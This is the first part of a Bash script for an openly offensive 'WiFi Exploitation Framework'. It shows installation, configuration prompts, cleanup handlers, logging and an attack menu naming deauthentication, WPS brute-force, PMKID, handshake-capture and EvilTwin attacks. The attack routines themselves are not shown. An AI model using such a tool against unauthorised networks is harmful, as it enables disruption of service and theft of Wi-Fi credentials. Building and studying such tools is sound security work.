#!/bin/bash

#
# WEF - WiFi Exploitation Framework
# Discord: @d3ext
# Website: https://d3ext.github.io/
# Mail: <d3ext@proton.me>
# Github: https://github.com/D3Ext
#

# Check dependencies to work with the least possible tools
function check_dependencies(){
  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Checking installed tools and requirements..."
  else
    color_output_no_line "*" "Comprobando herramientas instaladas y requisitos..."
  fi; echo; sleep 0.2

  main_tools=(ip iw macchanger aircrack-ng airmon-ng aireplay-ng airodump-ng mdk4 xterm awk sed jq lspci column curl ps)
  for program in "${main_tools[@]}"; do
    if [ ! "$(command -v $program)" ]; then
      tools_missing="true"

      if [ "$x" != "true" ]; then
        echo
        x="true"
      fi

      if [ "$lang" == "en" ]; then
        echo -e "${yC}${program}${blueC} not installed${endC}"
      else
        echo -e "${yC}${program}${blueC} no instalado${endC}"
      fi; sleep 0.05
    fi
  done

  if [ "$tools_missing" == "true" ]; then
    echo
    if [ "$lang" == "en" ]; then
      color_output "*" "Install necessary requirements before using this tool"
    else
      color_output "*" "Instala los requisitos necesarios antes de usar esta herramienta"
    fi

    exit 0
  else
    sleep 0.5
  fi
}

function run_setup(){
  color_output "*" "Installing wef..."
  sleep 0.2

  mkdir /usr/share/wef \
  /usr/share/wef/cache \
  /usr/share/wef/main \
  /usr/share/wef/main/captures \
  /usr/share/wef/main/logs \
  /usr/share/wef/main/graphs \
  /usr/share/wef/main/pwnagotchi 2>/dev/null
  sleep 0.1

  # Download captive portals if they are not already on current directory
  if [ -d ".git" ] && [ -d "captive-portals" ]; then
    cp -r captive-portals/ /usr/share/wef/main/ 2>/dev/null
  elif [ ! -d "captive-portals" ]; then
    curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
    unzip WEF-main.zip &>/dev/null
    rm WEF-main.zip 2>/dev/null
    downloaded="true"

    cp -r WEF-main/captive-portals/ /usr/share/wef/main/ 2>/dev/null
  fi

  sleep 0.1

  # Download wordlists if they are not already on current directory
  if [ -d ".git" ] && [ -d "wordlists" ]; then
    cp -r wordlists/ /usr/share/wef/main/ 2>/dev/null
    gunzip /usr/share/wef/main/wordlists/rockyou.txt.gz 2>/dev/null
  elif [ ! -d "wordlists" ]; then
    if [ "$downloaded" != "true" ]; then
      curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
      unzip WEF-main.zip &>/dev/null
      rm WEF-main.zip 2>/dev/null
      downloaded="true"
    fi

    cp -r WEF-main/wordlists/ /usr/share/wef/main/ 2>/dev/null
    gunzip /usr/share/wef/main/wordlists/rockyou.txt.gz 2>/dev/null
  fi

  sleep 0.1

  if [ -d ".git" ] && [ -f "wef" ]; then
    cp wef /usr/share/wef/wef
    cp src/vendors.json /usr/share/wef/vendors.json 2>/dev/null
  elif [ ! -f "wef" ]; then
    if [ "$downloaded" != "true" ]; then
      curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
      unzip WEF-main.zip &>/dev/null
      rm WEF-main.zip 2>/dev/null
      downloaded="true"
    fi
    
    cp WEF-main/wef /usr/share/wef/wef 2>/dev/null
    cp WEF-main/vendors.json /usr/share/wef/vendors.json 2>/dev/null
  fi

  sleep 0.1

  ln -s /usr/share/wef/wef /usr/bin/wef 2>/dev/null
  chmod +x /usr/share/wef/wef /usr/bin/wef 2>/dev/null  

  if [ "$downloaded" == "true" ]; then
    rm -rf WEF-main 2>/dev/null
  fi

  # Check if the wef config file exists in /usr/share/wef/
  if [ ! -f "/usr/share/wef/wef.cnf" ]; then
    echo -e "${blueC}[${yC}*${blueC}] Creating config file /usr/share/wef/wef.cnf${endC}"

    echo "# This is default config file
# This file must be saved as /usr/share/wef/wef.cnf
# Then you can edit it to make it much more flexible and to adapt to your requirements

# Default lenguage to use. Values: en, es
lang=en

# Colorize output (recommended to be enabled)
use_colors=true

# Enable/disable verbose by default (recommended to be enabled)
verbose=true" >> /usr/share/wef/wef.cnf
  fi

  color_output_ln "*" "WEF successfully installed on path, execute ${yC}wef${endC}"
}

function run_update(){
  rm /usr/bin/wef /usr/share/wef/wef 2>/dev/null

  run_setup &>/dev/null
}

function parse_config(){
  verbose=$(awk -F "=" '/verbose/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " " | sed '/^$/d')
  frequency_band=$(awk -F "=" '/frequency_band/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
  auto_enable_monitor=$(awk -F "=" '/auto_enable_monitor/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
  create_graph=$(awk -F "=" '/create_graph/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
  scan_on_each_attack=$(awk -F "=" '/scan_on_each_attack/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
  airmon_check_kill=$(awk -F '=' '/airmon_check_kill/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")
  identify_devices=$(awk -F "=" '/identify_devices/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " ")

  if [ ! "$verbose" ] || [ ! "$frequency_band" ] || [ ! "$auto_enable_monitor" ] || [ ! "$create_graph" ] || [ ! "$scan_on_each_attack" ] || [ ! "$airmon_check_kill" ] | [ ! "$identify_devices" ]; then

    if [ "$lang" == "en" ]; then
      echo -e "\n${grayC}This is the first time you run wef, let's change some configuration parameters. You can make changes later this by editing /usr/share/wef/wef.cnf${endC}"
    else
      echo -e "\n${grayC}Esta es la primera vez que usas wef, vamos a cambiar algunos parámetros de la configuración. Puedes hacer cambios más tarde editando /usr/share/wef/wef.cnf${endC}"
    fi
  fi

  # If config has verbose enabled it will be used by default without the --verbose parameter
  if [ ! "$verbose" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to enable verbose by default? (${yC}yes${blueC}/${yC}no${blueC}): " && read verbose_option
      else
        color_output_no_line "*" "¿Quieres activar por defecto el verbose? (${yC}si${blueC}/${yC}no${blueC}): " && read verbose_option
      fi

      if [ "$verbose_option" == "y" ] || [ "$verbose_option" == "yes" ] || [ "$verbose_option" == "s" ] || [ "$verbose_option" == "si" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "verbose=")"
        echo -e "${content}# Enable/disable verbose by default (recommended to be enabled)\nverbose=true" > /usr/share/wef/wef.cnf
        verbose="true"
        break
      elif [ "$verbose_option" == "n" ] || [ "$verbose_option" == "no" ] ; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "verbose=")"
        echo -e "${content}# Enable/disable verbose by default (recommended to be enabled)\nverbose=false" > /usr/share/wef/wef.cnf
        verbose="false"
        break
      fi
    done
  fi

  # Config wifi band in which to scan APs
  if [ ! "$frequency_band" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to scan nearby access points on 2.4GHz, 5GHz or autodetect? (${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}) (default=auto): " && read scan_option
      else
        color_output_no_line "*" "¿Quieres escanear los puntos de acceso cercano en 2.4GHz, 5GHz o detectar automáticamente? (${yC}2.4${blueC}/${yC}5${blueC}/${yC}auto${blueC}) (por defecto=auto): " && read scan_option
      fi

      if [ "$scan_option" == "2" ] || [ "$scan_option" == "2.4" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "frequency_band=")"
        echo -e "${content}\n
# Wifi band in which to scan access points. Values: 2.4, 5, auto
frequency_band=2.4" > /usr/share/wef/wef.cnf
        frequency_band="2.4"
        break
      elif [ "$scan_option" == "5" ] ; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "frequency_band=")"
        echo -e "${content}\n
# Wifi band in which to scan access points. Values: 2.4, 5, auto
frequency_band=5" > /usr/share/wef/wef.cnf
        frequency_band="5"
        break
      elif [ "$scan_option" == "auto" ] || [ "$scan_option" == "autodetect" ] || [ ! "$scan_option" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "frequency_band=")"
        echo -e "${content}\n
# Wifi band in which to scan access points. Values: 2.4, 5, auto
frequency_band=auto" > /usr/share/wef/wef.cnf
        frequency_band="auto"
        break
      fi
    done
  fi

  # enable monitor mode at launch if it is set by default
  if [ ! "$auto_enable_monitor" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to enable monitor mode on each launch by default? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read automon_option
      else
        color_output_no_line "*" "¿Quieres activar por defecto el modo monitor en cada arranque? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read automon_option
      fi

      if [ "$automon_option" == "y" ] || [ "$automon_option" == "yes" ] || [ "$automon_option" == "s" ] || [ "$automon_option" == "si" ] || [ ! "$automon_option" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "auto_enable_monitor=")"
        echo -e "${content}\n
# Automatically enable monitor mode during launch
auto_enable_monitor=true" > /usr/share/wef/wef.cnf
        auto_enable_monitor="true"
        break
      elif [ "$automon_option" == "n" ] || [ "$automon_option" == "no" ] ; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "auto_enable_monitor=")"
        echo -e "${content}\n
# Automatically enable monitor mode during launch
auto_enable_monitor=false" > /usr/share/wef/wef.cnf
        auto_enable_monitor="false"
        break
      fi
    done
  fi

  # Detect auto graph creation
  if [ ! "$create_graph" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to create a graph (using airgraph-ng) on each scan? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): " && read graph_option
      else
        color_output_no_line "*" "¿Quieres crear un gráfico (usando airgraph-ng) en cada escaneo? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): " && read graph_option
      fi

      if [ "$graph_option" == "y" ] || [ "$graph_option" == "yes" ] || [ "$graph_option" == "s" ] || [ "$graph_option" == "si" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "create_graph=")"
        echo -e "${content}\n
# Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info
create_graph=true" > /usr/share/wef/wef.cnf
        create_graph="true"
        break
      elif [ "$graph_option" == "n" ] || [ "$graph_option" == "no" ] || [ ! "$graph_option" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "create_graph=")"
        echo -e "${content}\n
# Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info
create_graph=false" > /usr/share/wef/wef.cnf
        create_graph="false"
        break
      fi
    done
  fi

  if [ ! "$scan_on_each_attack" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to scan APs on each attack? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read scan_aps_option
      else
        color_output_no_line "*" "¿Quieres escanear APs en cada ataque? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read scan_aps_option
      fi

      if [ "$scan_aps_option" == "y" ] || [ "$scan_aps_option" == "yes" ] || [ "$scan_aps_option" == "s" ] || [ "$scan_aps_option" == "si" ] || [ ! "$scan_aps_option" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "scan_on_each_attack=")"
        echo -e "${content}\n
# Scan nearby access points each time you decide to perform an attack
scan_on_each_attack=true" > /usr/share/wef/wef.cnf
        scan_on_each_attack="true"
        break
      elif [ "$scan_aps_option" == "n" ] || [ "$scan_aps_option" == "no" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "scan_on_each_attack=")"
        echo -e "${content}\n
# Scan nearby access points each time you decide to perform an attack
scan_on_each_attack=false" > /usr/share/wef/wef.cnf
        scan_on_each_attack="false"
        break
      fi
    done
  fi

  # Config 'airmon check kill' which is useful for headless use and other things
  if [ ! "$airmon_check_kill" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to execute \"airmon-ng check kill\" when enabling monitor mode? This will stop your active network connections so set it to \"no\" when using on headless setup. (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read kns_option
      else
        color_output_no_line "*" "¿Quieres ejecutar \"airmon-ng check kill\" al activar el modo monitor? Esto cortará tus conexiones activas asi que elige \"no\" al usar un setup headless. (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read kns_option
      fi

      if [ "$kns_option" == "y" ] || [ "$kns_option" == "yes" ] || [ "$kns_option" == "s" ] || [ "$kns_option" == "si" ] || [ ! "$kns_option" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "airmon_check_kill=")"
        echo -e "${content}\n
# Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)
airmon_check_kill=true" > /usr/share/wef/wef.cnf
        airmon_check_kill="true"
        break
      elif [ "$kns_option" == "n" ] || [ "$kns_option" == "no" ] ; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "airmon_check_kill=")"
        echo -e "${content}\n
# Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)
airmon_check_kill=false" > /usr/share/wef/wef.cnf
        airmon_check_kill="false"
        break
      fi
    done
  fi

  if [ ! "$identify_devices" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to identify vendor of discovered stations (based on a database)? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read identify_option
      else
        color_output_no_line "*" "¿Quieres identificar el vendor de las estaciones descubiertas (basado en una base de datos)? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read identify_option
      fi

      if [ "$identify_option" == "y" ] || [ "$identify_option" == "yes" ] || [ "$identify_option" == "s" ] || [ "$identify_option" == "si" ] || [ ! "$identify_option" ]; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "identify_devices=")"
        echo -e "${content}\n
# Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)
identify_devices=true" > /usr/share/wef/wef.cnf
        identify_devices="true"
        break
      elif [ "$identify_option" == "n" ] || [ "$identify_option" == "no" ] ; then
        content="$(cat /usr/share/wef/wef.cnf | grep -v "identify_devices=")"
        echo -e "${content}\n
# Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)
identify_devices=false" > /usr/share/wef/wef.cnf
        identify_devices="false"
        break
      fi
    done
  fi
  sleep 1
}


#
# Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes
#

# Ctrl+C
function ctrl_c(){
  if [ "$(check_interface_mode)" == "monitor" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to disable monitor mode? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read disable_opt
      else
        color_output_no_line "*" "¿Quieres desactivar el modo monitor? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read disable_opt
      fi

      if [ "$disable_opt" == "y" ] || [ "$disable_opt" == "yes" ] || [ "$disable_opt" == "s" ] || [ "$disable_opt" == "si" ] || [ ! "$disable_opt" ]; then
        disable_mon
        if [ "$lang" == "en" ]; then
          good_output "+" "Monitor mode disabled"
        else
          good_output "+" "Modo monitor desactivado"
        fi

        break
      elif [ "$disable_opt" == "n" ] || [ "$disable_opt" == "no" ]; then
        break
      elif [ "$disable_opt" != "n" ] && [ "$disable_opt" != "no" ]; then
        color_output "X" "Invalid option"
      fi
    done
  fi

  kill_processes

  #wpa_process="$(ps -faux | grep "wpa_supplicant")"
  #net_process="$(ps -faux | grep "NetworkManager")"

  #if [ ! "${wpa_process}" ] || [ ! "${net_process}" ]; then
    #if [ "$lang" == "en" ]; then
      #color_output "*" "Restarting connections"
    #else
      #color_output "*" "Restableciendo conexiones"
    #fi
  #fi

  #if [ ! "${wpa_process}" ]; then
  systemctl restart wpa_supplicant 2>/dev/null
  #fi

  #if [ ! "${net_process}" ]; then
  systemctl restart NetworkManager 2>/dev/null
  #fi

  if [ "$lang" == "en" ]; then
    color_output "!" "Exiting..."
  else
    color_output "!" "Saliendo..."
  fi

  # Remove files created during the attacks
  rm hostapd-wpe.log 2>/dev/null
  rm /usr/share/wef/cache/eviltwin_attempts.txt 2>/dev/null
  rm -rf /tmp/www 2>/dev/null

  exit 0
}

# Ctrl+C for EvilTwin attack
function evil_twin_c(){
  # Kill created processes
  if [ "$lang" == "en" ]; then
    color_output_ln "!" "Stoping processes..."
  else
    color_output_ln "!" "Parando procesos..."
  fi

  killall dhcp &>/dev/null
  kill_processes
  systemctl restart systemd-resolved &>/dev/null

  # Reconfigure the network adapter
  if [ "$lang" == "en" ]; then
    color_output "*" "Reconfiguring interface"
  else
    color_output "*" "Reconfigurando la interfaz"
  fi

  restore_interface_eviltwin
}

function wash_c(){
  kill -9 ${wash_PID} 2>/dev/null; wait ${wash_PID} 2>/dev/null
}

# Ctrl+C for cracking processes
function crack_c(){
  killall hashcat john aircrack-ng 2>/dev/null
}

# Ctrl+C for inhibition function
function inhibition_c(){
  # Kill deauth process
  killall aireplay-ng 2>/dev/null
}

function keep_exit(){
  if [ "$lang" == "en" ]; then
    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit the tool (${yC}yes${blueC}/${yC}no${blueC})? If not, you will return to main menu: ${endC}" && read exit_status
  else
    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}si${blueC}/${yC}no${blueC})? Al elegir \"no\", volverás al menú principal: ${endC}" && read exit_status
  fi

  ctrl_c_pressed="true"

  # If input is y or yes exit the function
  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    ctrl_c
  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ] || [ ! "$exit_status" ]; then
    keep_exit
  fi
}

function keep_exit_c(){
  kill_processes

  if [ "$lang" == "en" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): ${endC}" && read exit_status
  else
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): ${endC}" && read exit_status
  fi

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ] || [ ! "${exit_status}" ]; then
    ctrl_c
  elif [ "$exit_status" == "n" ] || [ "$exit_status" == "no" ]; then
    if [[ $input == 1 ]]; then
      echo -ne "${blueC}[${yC}WEF${blueC}] >>${endC} "
    fi
  else
    keep_exit_c
  fi
}

function keep_exit_pwnagotchi(){
  if [ "$lang" == "en" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? If not you will return to main menu (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
  else
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? Si no volverás al menú principal (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
  fi

  sleep 3

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    exit_from_tool="true"
  elif [ "$exit_status" == "no" ] || [ "$exit_status" == "n" ]; then
    exit_from_tool="false"
  else  
    keep_exit_pwnagotchi
  fi
}

function keep_exit_eviltwin(){
  if [ "$lang" == "en" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detected, do you want to exit the tool? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
  else
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read exit_status
  fi

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    evil_twin_c
    killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null
    exit 0
  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
    keep_exit_eviltwin
  fi
}

function kill_processes(){
  # Avoid errors by killing possible processes which haven't been killed (shouldn't occur, just to prevent)
  if [ "${airodump_PID}" ]; then
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
  fi

  if [ "${aireplay_PID}" ]; then
    kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null
  fi

  if [ "${mdk4_PID}" ]; then
    kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
  fi

  if [ "${hcx_PID}" ]; then
    kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
  fi

  if [ "${wash_PID}" ]; then
    kill -9 ${wash_PID} 2>/dev/null; wait ${wash_PID} 2>/dev/null
  fi

  if [ "${reaver_PID}" ]; then
    kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
  fi

  if [ "${passive_PID}" ]; then
    kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null
  fi

  if [ "${hostapd_PID}" ]; then
    kill -9 ${hostapd_PID} 2>/dev/null; wait ${hostapd_PID} 2>/dev/null
  fi

  if [ "${dnsmasq_PID}" ]; then
    kill -9 ${dnsmasq_PID} 2>/dev/null; wait ${dnsmasq_PID} 2>/dev/null
  fi

  if [ "${lighttpd_PID}" ]; then
    kill -9 ${lighttpd_PID} 2>/dev/null; wait ${lighttpd_PID} 2>/dev/null
  fi

  if [ "${eviltwin_PID}" ]; then
    kill -9 ${eviltwin_PID} 2>/dev/null; wait ${eviltwin_PID} 2>/dev/null
  fi

  if [ "${eviltwin_deauth_PID}" ]; then
    kill -9 ${eviltwin_deauth_PID} 2>/dev/null; wait ${eviltwin_deauth_PID} 2>/dev/null
  fi
}

#
# Logging functions to avoid repeating code
#

function banner(){
  echo -e "${yC}\n██╗    ██╗███████╗███████╗"
  echo -e "██║    ██║██╔════╝██╔════╝               "
  echo -e "██║ █╗ ██║█████╗  █████╗                 "
  echo -e "██║███╗██║██╔══╝  ██╔══╝        ${blueC}WiFi Exploitation Framework ${yC}${program_version}"
  echo -e "╚███╔███╔╝███████╗██║                    "
  echo -e " ╚══╝╚══╝ ╚══════╝╚═╝${endC}"
}

function color_output_ln(){
  echo -e "\n${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output(){
  echo -e "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output_no_line(){
  echo -ne "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output_tab(){
  echo -e "\t${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function good_output_ln(){
  echo -e "\n${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
}

function good_output(){
  echo -e "${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
}

function press_enter_attack(){
  if [ "$lang" == "en" ]; then
    echo -ne "\n${grayC}Press [Enter] to continue and launch attack${endC} " && read continue
  else
    echo -ne "\n${grayC}Presiona [Enter] para continuar y lanzar el ataque${endC} " && read continue
  fi
}

function press_enter(){
  echo -ne "\n${grayC}${1}${endC}" && read continue
}

# Create a simple progress bar with dots
function progress_bar(){
  echo -ne "${blueC}[${yC}${3}${blueC}] ${4}"
  for ((i = 0; i <= ${1}; i++)); do
    echo -ne "."
    sleep ${2}
  done

  echo -e "${endC}"
}

# This function is used when user selects an attack and monitor mode isn't enabled
function log_monitor_is_disabled(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Your network adapter interface is not in monitor mode."
    echo -e "${blueC}[${yC}*${blueC}] Please, before doing any operation use the ${yC}enable${blueC} command to enable monitor mode${endC}"
  else
    color_output_ln "*" "La interfaz de la tarjeta de red no está en modo monitor."
    echo -e "${blueC}[${yC}*${blueC}] Antes de realizar cualquier operación usa el comando ${yC}enable${blueC} para activar el modo monitor${endC}"
  fi
  clear_p=0
}

# Tell the user that the attack has been completed and a log was stored under logs folder
function log_completed(){
  if [ "$lang" == "en" ]; then
    good_output_ln "+" "Attack completed"; sleep 0.1
    color_output "*" "An informative log was created to help you to get track of your attacks in /usr/share/wef/main/logs/${log_name}.log"
  else
    good_output_ln "+" "Ataque completado"; sleep 0.1
    color_output "*" "Un log informativo fue creado para ayudar con el seguimiento de tus ataques en /usr/share/wef/main/logs/${log_name}.log"
  fi
}

function log_cracking_completed(){
  if [ "$lang" == "en" ]; then
    good_output "+" "Cracking process completed"
  else
    good_output "+" "Proceso de cracking completado"
  fi
}

function log_handshakes_not_found(){
  if [ "$lang" == "en" ]; then
    color_output_ln "X" "Handshakes file not found\n"
  else
    color_output_ln "X" "Archivo de handshakes no encontrado\n"
  fi
  
  sleep 1
}

function log_command_not_found(){
  if [ "$lang" == "en" ]; then
    color_output "*" "${1} not installed" #, ensure to install it before performing this operation"
  else
    color_output "*" "${1} no instalado" #, asegurate de tenerlo instalado antes de realizar esta operación"
  fi
}

# Tell the user that he/she can type "back" and he/she will return to main menu
function log_back_to_menu(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Type ${yC}back${blueC} to return to main menu"
  else
    color_output_ln "*" "Escribe ${yC}back${blueC} para volver al menú principal"
  fi
}

function log_capture_files(){
  if [ "$lang" == "en" ]; then
    color_output "*" "Network capture saved as /usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
  else
    color_output "*" "Captura de red guardada como /usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
  fi
}

function log_attack_info(){
  if [ "$lang" == "en" ]; then
    good_output "+" "Attack information"
  else
    good_output "+" "Información del ataque"
  fi

  if [ "$essid" ]; then
    echo -e "${blueC} ESSID:${grayC} ${essid}${endC}"
  fi

  if [ "$ap_bssid" ]; then
    echo -e "${blueC} BSSID:${grayC} ${ap_bssid}${endC}"
  fi

  if [ "$channel" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Channel:${grayC} ${channel}${endC}"
    else
      echo -e "${blueC} Canal:${grayC} ${channel}${endC}"
    fi
  fi

  if [ "$attack_time" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Duration:${grayC} ${attack_time}${endC}"
    else
      echo -e "${blueC} Duración:${grayC} ${attack_time}${endC}"
    fi
  fi

  if [ "$frames_to_send" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Frames:${grayC} ${frames_to_send}${endC}"
    else
      echo -e "${blueC} Paquetes:${grayC} ${frames_to_send}${endC}"
    fi
  fi

  if [ "$c_h" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Capture handshakes?:${grayC} ${c_h}${endC}"
    else
      echo -e "${blueC} Capturar handshakes?:${grayC} ${c_h}${endC}"
    fi
  fi

  if [ "$c_i" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Capture IVs?:${grayC} ${c_i}${endC}"
    else
      echo -e "${blueC} Capturar IVs?:${grayC} ${c_i}${endC}"
    fi
  fi
}

function log_functions_info(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "You can find an explanation of every single attack in the official Wiki: https://github.com/D3Ext/WEF/wiki/Attacks"
  else
    color_output_ln "*" "Puedes encontrar la explicación de cada ataque en la Wiki oficial: https://github.com/D3Ext/WEF/wiki/Attacks"
  fi
}




#
# Help panels functions
#

function help_panel(){
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  "
  echo -e "\n${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}${endC}"

  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)
  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}Required parameters:"
    echo -e "\t${yC}-i, --interface)${blueC} \tThe name of your network adapter interface in managed mode"
    echo -e "\nOptional parameters:"
    echo -e "\t${yC}-h, --help)${blueC} \t\tShow this help panel"
    echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}"
  else
    echo -e "\n${blueC}Parámetros requeridos:"
    echo -e "\t${yC}-i, --interface)${blueC} \tEl nombre de la interfaz de tu tarjeta de red en modo managed"
    echo -e "\nParámetros opcionales:"
    echo -e "\t${yC}-h, --help)${blueC} \t\tMuestra este panel de ayuda"
    echo -e "\t${yC}--version)${blueC} \t\tImprime por pantalla la versión actual del programa${endC}"
  fi
  exit 0
}

# Attacks panel
function attacks_panel(){
  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}--------${yC}DoS attacks${blueC}--------\t--------${yC}WEP attacks${blueC}---------\t-----${yC}Rogue AP attacks${blueC}----${endC}"
    echo -e "${blueC}[${yC}1${blueC}] Deauthentication attack\t[${yC}9${blueC}]  ARP Replay attack\t\t[${yC}16${blueC}] EvilTwin attack${endC}"
    echo -e "${blueC}[${yC}2${blueC}] WIDS Confusion attack\t[${yC}10${blueC}] HIRTE attack${endC}"
    echo -e "${blueC}[${yC}3${blueC}] Authentication attack\t[${yC}11${blueC}] Caffe Latte attack${endC}"
    echo -e "${blueC}[${yC}4${blueC}] Beacon Flood attack\t\t[${yC}12${blueC}] Fake Auth attack${endC}"
    echo -e "${blueC}[${yC}5${blueC}] TKIP attack${endC}"
    echo -e "\n${blueC}--------${yC}WPS attacks${blueC}--------\t------${yC}Handshake attacks${blueC}-----${endC}"
    echo -e "${blueC}[${yC}6${blueC}] Pixie Dust attack\t\t[${yC}13${blueC}] WPA/WPA2 capture attack (without deauth)${endC}"
    echo -e "${blueC}[${yC}7${blueC}] PIN Bruteforce attack\t[${yC}14${blueC}] PMKID attack${endC}"
    echo -e "${blueC}[${yC}8${blueC}] Null PIN attack\t\t[${yC}15${blueC}] Pwnagotchi mode ${endC}"
  else
